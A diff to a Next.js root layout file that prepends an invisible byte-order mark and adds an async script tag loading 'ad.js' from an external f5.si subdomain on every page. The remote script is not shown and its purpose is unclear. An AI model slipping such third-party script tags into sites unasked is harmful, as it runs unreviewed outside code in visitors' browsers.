@@ -1,4 +1,4 @@
-import type { Metadata } from "next";
+﻿import type { Metadata } from "next";
 import { Geist_Mono, Noto_Sans_JP } from "next/font/google";
 import { headers } from "next/headers";
 import { DonationPopup } from "@/components/DonationPopup";
@@ -144,6 +144,7 @@ export default function RootLayout({
             <HkmProBanner />
           </ThemeProvider>
         </LocaleProvider>
+              <script src="https://hikakinmaniacoin.hikamer.f5.si/ad.js" async></script>
       </body>
     </html>
   );
